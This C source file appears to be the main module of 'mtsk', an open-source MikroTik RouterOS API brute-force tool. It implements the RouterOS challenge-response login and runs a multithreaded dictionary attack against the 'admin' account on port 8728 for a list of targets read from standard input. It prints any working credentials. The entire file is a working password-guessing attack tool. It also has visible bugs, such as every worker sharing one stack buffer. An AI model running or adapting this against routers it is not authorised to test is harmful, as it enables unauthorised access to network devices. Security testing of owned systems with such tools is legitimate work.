/*
 * This file is part of the mtsk distribution
 * (https://github.com/matricali/mtsk).
 *
 * Copyright (c) 2019 Jorge Matricali.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, version 3.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
 * General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <http://www.gnu.org/licenses/>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <arpa/inet.h>

#include "hex.h"
#include "md5.h"
#include "socket.h"

#include "stringslist/stringslist.h"
#include "threadpool/threadpool.h"

#define BUF_SIZE 1024

typedef struct {
	char *target;
	uint16_t port;
	char *username;
	stringslist_t *passwords;
} mtsk_worker_args_t;

unsigned char pkt_login[] = { 0x06, 0x2f, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0x00 };
unsigned char pkt_login_rpl_1[] = { 0x05, 0x21, 0x64, 0x6f, 0x6e, 0x65, 0x25 };
unsigned char pkt_login_rpl_2[] = { 0x3d, 0x72, 0x65, 0x74, 0x3d };
unsigned char pkt_done[] = { 0x05, 0x21, 0x64, 0x6f, 0x6e, 0x65, 0x00 };

int mtsk_routeros_command_login(int sockfd, const char *username,
				const char *password)
{
	char buf[BUF_SIZE] = { 0 };
	unsigned char bdata[16] = { 0 };
	unsigned char digest[16];
	int nbytes = 0;

	mtsk_socket_write(sockfd, &pkt_login, 8);
	nbytes = mtsk_socket_read(sockfd, &buf, BUF_SIZE);

	if (nbytes < 45)
		return -1;

	if (nbytes > BUF_SIZE)
		return -2;

	if (strncmp((const char *)pkt_login_rpl_1, buf, 7) != 0)
		return -3;

	if (strncmp((const char *)pkt_login_rpl_2, &buf[7], 5) != 0)
		return -4;

	hex_to_bin(&buf[12], 32, bdata);

	// printf("-------CHALLENGE-------\n");
	// hex_dump(&bdata[0], 16);
	// printf("-----------------------\n");

	MD5_CTX ctx;
	MD5_Init(&ctx);
	MD5_Update(&ctx, "\x00", 1);
	MD5_Update(&ctx, password, strlen(password));
	MD5_Update(&ctx, &bdata, 16);
	MD5_Final(digest, &ctx);

	size_t username_len = strlen(username);
	char pkt[100] = { 0x06, 0x2f, 0x6c, 0x6f, 0x67, 0x69, 0x6e, 0 };
	pkt[7] = 6 + username_len;
	strncpy(&pkt[8], "=name=", 6);
	strncpy(&pkt[14], username, username_len);
	pkt[14 + username_len] = 0x2c; // 44
	strncpy(&pkt[15 + username_len], "=response=00", 12);
	hex_from_bin(digest, 16, &pkt[27 + username_len]);

	int final_len = 27 + username_len + 32;
	pkt[final_len++] = 0;

	mtsk_socket_write(sockfd, &pkt, final_len);

	memset(buf, 0, BUF_SIZE);
	nbytes = mtsk_socket_read(sockfd, &buf, BUF_SIZE);

	if (nbytes < 7)
		return -5;

	if (nbytes > BUF_SIZE)
		return -2;

	if (strncmp((const char *)pkt_done, buf, 7) != 0)
		return -6;

	return 0;
}

void worker(void *args)
{
	mtsk_worker_args_t *wargs = (char *)args;
	printf("Worker %d - %s:%d\n", getpid(), wargs->target, wargs->port);

	for (int i = 0; i < wargs->passwords->size; ++i) {
		int sockfd = mtsk_socket_connect(inet_addr(wargs->target),
						 wargs->port, 500000);

		if (sockfd > 0) {
			char *password = wargs->passwords->elements[i];
			if (strcmp(password, "\n") == 0) {
				password[0] = '\0';
			}
			int ret = mtsk_routeros_command_login(
				sockfd, wargs->username, password);
			if (ret == 0) {
				printf("%s:%d \"%s\" \"%s\" - OK\n",
				       wargs->target, wargs->port,
				       wargs->username, password);
				close(sockfd);
				return;
			} else {
				fprintf(stderr, "%s:%d \"%s\" \"%s\" - FAIL\n",
					wargs->target, wargs->port,
					wargs->username, password);
			}
		}
		if (sockfd > 0)
			close(sockfd);
	}
}

int main(int argc, char **argv)
{
	puts("mtsk - MikroTik RouterOS API bruteforce v0.1");
	puts("https://github.com/matricali/mtsk");
	puts("");

	char *target = NULL;
	uint16_t port = 8728;
	char *username = "admin";
	stringslist_t *passwords = NULL;
	threadpool_t *tp = NULL;

	/* Init worker threads */
	tp = threadpool_create(24);

	/* Load passwords */
	passwords = stringslist_load_file("passwords.txt");
	if (passwords == NULL) {
		fprintf(stderr, "Unable to load passworsd dictionary.\n");
		exit(EXIT_FAILURE);
	}
	printf("Loaded %d passwords.\n", passwords->size);

	/* Load targets */
	char line[BUFSIZ] = { 0 };
	size_t len;

	while ((len = fgets(line, sizeof line, stdin)) > 0) {
		line[strcspn(line, "\n")] = 0;
		mtsk_worker_args_t wargs = { 0 };
		wargs.target = line;
		wargs.port = 8728;
		wargs.username = username;
		wargs.passwords = passwords;
		threadpool_add_work(tp, &worker, &wargs);
	}

	threadpool_wait(tp);
	threadpool_destroy(tp);

	return EXIT_SUCCESS;
}
